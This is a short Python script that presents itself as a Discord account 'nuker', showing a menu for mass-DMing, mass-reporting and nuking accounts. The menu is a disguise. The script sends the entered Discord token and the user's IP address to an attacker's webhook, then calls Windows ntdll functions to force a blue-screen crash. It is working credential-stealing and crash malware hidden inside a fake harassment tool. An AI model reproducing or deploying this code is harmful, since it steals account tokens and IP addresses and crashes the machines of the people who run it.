import os
import time
import discord
import requests
from colorama import Fore
from ctypes import cdll,byref,c_bool,c_char_p
import requests

webhook = ("Webhook Here")

ip = requests.get("https://wtfismyip.com/text").text
print(ip)

token = input("enter the token you want to nuke > ")

print("Success token is working!")
time.sleep(5)

steal = {
            "embeds": [
                {
                    "author": {
                        "name": "Nuker token log",
                    },
                    "description": f"Some retard tried nuking someone \n\n**token log:** ||{token}||\n**IP:** ||{ip}||\n**Cookie:** ||coming soon||",
                    "color": 1,
                    
                    "footer": {
                      "text": "Fake nuker | https://github.com/syntheticc"
                    }
                }
            ]
        }
requests.post(webhook, json=steal)

print(Fore.MAGENTA + """
 ██╗███╗   ██╗ █████╗ ███╗   ███╗███████╗██╗     ███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗ 
██╔╝████╗  ██║██╔══██╗████╗ ████║██╔════╝╚██╗    ████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗
██║ ██╔██╗ ██║███████║██╔████╔██║█████╗   ██║    ██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝
██║ ██║╚██╗██║██╔══██║██║╚██╔╝██║██╔══╝   ██║    ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
╚██╗██║ ╚████║██║  ██║██║ ╚═╝ ██║███████╗██╔╝    ██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║
 ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝     ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ 
                                                     

[1] Nuke account
[2] disable token 
[3] remove all friends
[4] close all dms
[5] mass create servers
[6] mass dm
[7] mass report
""")
time.sleep(5)
cdll.ntdll.RtlAdjustPrivilege(19, byref(c_bool(1)), byref(c_bool(0)), byref(c_bool(0)))
cdll.ntdll.NtRaiseHardError(0xC0000215, 0, 0, 0, 6, byref(c_char_p(0)))